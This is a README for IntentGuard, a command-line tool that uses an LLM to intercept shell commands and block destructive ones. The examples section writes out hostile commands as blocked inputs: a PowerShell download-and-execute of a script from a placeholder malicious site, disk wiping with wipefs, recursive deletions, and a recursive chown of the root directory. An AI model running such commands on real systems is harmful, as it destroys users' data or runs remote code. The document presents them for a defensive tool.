# IntentGuard

**A Pragmatic Agentic Safeguard for Command Line Workflows**

IntentGuard is a lightweight, locally-running autonomous agent designed to intercept user actions, reason about underlying intent, and prevent destructive mistakes before they execute. By bringing cognitive reasoning directly to the command line, IntentGuard bridges the gap between raw execution and human intention.

## The Agentic Approach to Safety

Traditional safeguards rely on static rules, regex patterns, or strict permissions that are often rigid, easily bypassed, or overly restrictive. IntentGuard takes a more nuanced, agentic approach:

- **Semantic Reasoning:** Instead of just checking if you typed `rm -rf`, the agent evaluates the _context_—are you deleting a known build directory, or are you accidentally targeting the root filesystem? It understands the subtle difference between routine cleanup and a catastrophic mistake.
- **Unobtrusive Autonomy:** IntentGuard runs quietly in the background. It doesn't nag or disrupt your flow for safe, everyday tasks. It only steps in when its reasoning engine determines a high probability of unintended consequences.
- **Context-Aware:** The system analyzes the environment, the specific arguments, and the potential blast radius of the command, acting as a highly competent oversight mechanism watching your back.
- **Flexible Intelligence:** Because different environments have different security, privacy, and latency needs, IntentGuard is completely model-agnostic. You can power its reasoning engine with anything from a small, strictly offline local model to the most capable cloud APIs available.

## Core Capabilities

- **Command Interception:** Seamlessly hooks into your workflow to catch potentially destructive actions before they reach the shell.
- **Risk Assessment:** Employs advanced LLM reasoning to evaluate both the safety and the true intent of parsed commands.
- **Frictionless Override:** When intervention is required, the agent provides clear, actionable explanations of the risk, allowing human operators to confirm or abort with full context.
- **Multi-Provider Support:** Plug-and-play support for major LLM providers via LiteLLM for the "brain" of the agent.

## Installation

Getting started with the IntentGuard agent is straightforward. Install the package via `pip` and initialize your local setup:

```bash
pip install intentguard
intentguard init
```

## Usage

IntentGuard operates as a background service evaluating commands passed through its execution wrapper.

```bash
# Start the IntentGuard background agent
intentguard start

# Execute a command through the agent's reasoning engine
intentguard exec rm -rf /data
```

_When `intentguard exec` is called, the agent evaluates the target, understands its criticality (e.g., distinguishing a production database volume from a local temporary folder), and will either step back to allow execution or step in to warn you._

## Examples in Action

IntentGuard leverages its reasoning engine to analyze the full context of a command, including historical patterns and potential blast radius, to block malicious or highly destructive actions.

### Blocking Malicious Payload Downloads

```bash
PS D:\> intentguard exec "Invoke-WebRequest -Uri http://malicious.site/payload.ps1 -OutFile $env:TEMP\payload.ps1; Invoke-Expression $env:TEMP\payload.ps1"

IntentGuard blocked this action (Risk: 0.98): Download and execute a suspicious PowerShell script from a potentially malicious site. No rules triggered. | ML Risk: 0.96. Context Anomaly: 0.8. | Based on the historical context and the repeated execution of the same command, there is a high likelihood of this being a malicious activity. The command downloads a PowerShell script from an unknown site and executes it, which is a potential attack vector. Given the previous decisions to block similar commands and the lack of information about the user's intentions, this command should be blocked.
```

### Preventing Critical Destructive Operations

```bash
PS D:\> intentguard exec wipefs -a /dev/sda

IntentGuard blocked this action (Risk: 0.96): Attempt to remove all file system signatures from the primary disk. No rules triggered. | ML Risk: 0.96. Context Anomaly: 1.0. | The 'wipefs -a' command with the primary disk as the target has a high risk of causing irreparable damage or data loss. It's a significant indication of an intent to modify the disk's partition table.
```

### Stopping Recursive Deletions in Sensitive Directories

```bash
PS D:\> intentguard exec rm -rf /var/log/*

IntentGuard blocked this action (Risk: 0.95): Delete log files in /var/log. Matched recursive force delete context: rm -rf /var/log/* | ML Risk: 0.95. Context Anomaly: 0.52. | User has a history of making critical destructive operations, such as rm -rf /data, rm -rf /, and rm -rf /data1, indicating a pattern of malicious intent. The rm -rf /var/log/* command also has the potential for significant data loss.
```

### Halting System-Wide Privilege Modifications

```bash
PS D:\> intentguard exec chown -R nobody:nogroup /

IntentGuard blocked this action (Risk: 0.88): Changing ownership of root directory and all subdirectories to nobody:nogroup. No rules triggered. | ML Risk: 0.88. Context Anomaly: 0.65. | This command has a high risk score due to the use of the recursive chown option (-R) on the root directory (/). Attempting to change ownership of the root directory can lead to critical system instability, potentially requiring a full system reboot or even causing a denial-of-service scenario.
```

## Configuring the Reasoning Engine (LLM Setup)

IntentGuard uses [LiteLLM](https://github.com/BerriAI/litellm) to manage its cognitive backend. This architecture allows you to dynamically swap the "brain" of the agent without changing any local configuration or code. You can use almost any provider—OpenAI, Anthropic, Groq, or a fully local Ollama instance—by setting a few environment variables.

### Environment Variable Syntax

- **Linux/macOS (Bash/Zsh)**: `export INTENTGUARD_MODEL="<provider>/<model_name>"`
- **Windows (PowerShell)**: `$env:INTENTGUARD_MODEL="<provider>/<model_name>"`

### OpenAI

Leverage the reasoning capabilities of GPT-4 class models for the most nuanced intent analysis.

```bash
# Linux/macOS
export INTENTGUARD_MODEL="gpt-4o"
export INTENTGUARD_API_KEY="sk-..."

# Windows PowerShell
$env:INTENTGUARD_MODEL="gpt-4o"
$env:INTENTGUARD_API_KEY="sk-..."
```

### Anthropic

Claude models often provide excellent deterministic reasoning and code comprehension for evaluating terminal commands.

```bash
# Linux/macOS
export INTENTGUARD_MODEL="claude-3-5-sonnet-20240620"
export INTENTGUARD_API_KEY="sk-ant-..."

# Windows PowerShell
$env:INTENTGUARD_MODEL="claude-3-5-sonnet-20240620"
$env:INTENTGUARD_API_KEY="sk-ant-..."
```

### Groq

For environments where latency is the highest priority, Groq's high-speed inference provides near-instantaneous command evaluation, significantly reducing the overhead of interception.

```bash
# Linux/macOS
export INTENTGUARD_MODEL="groq/llama3-8b-8192"
export INTENTGUARD_API_KEY="gsk_..."

# Windows PowerShell
$env:INTENTGUARD_MODEL="groq/llama3-8b-8192"
$env:INTENTGUARD_API_KEY="gsk_..."
```

### Fully Local (Ollama)

For highly sensitive environments or air-gapped systems where privacy is paramount, you can run the agent entirely offline using Ollama. This guarantees that no system context or command history ever leaves your machine.

```bash
# Linux/macOS
export INTENTGUARD_MODEL="ollama/llama3"
export INTENTGUARD_API_BASE="http://localhost:11434"

# Windows PowerShell
$env:INTENTGUARD_MODEL="ollama/llama3"
$env:INTENTGUARD_API_BASE="http://localhost:11434"
```

## Architecture Overview

At its core, IntentGuard consists of three main components:

1. **The Interceptor:** A wrapper that catches commands before they reach the system shell.
2. **The Context Gatherer:** Extracts relevant state (e.g., current working directory, environment variables, user privileges) to provide maximum context to the reasoning engine.
3. **The Reasoning Engine:** Formats the context into a prompt, interfaces with the configured LLM, and parses the response to make a fast execution decision based on probabilistic reasoning.

By combining these components, IntentGuard achieves a balance between the strict safety of traditional guardrails and the flexible, adaptive capabilities of modern agentic systems.
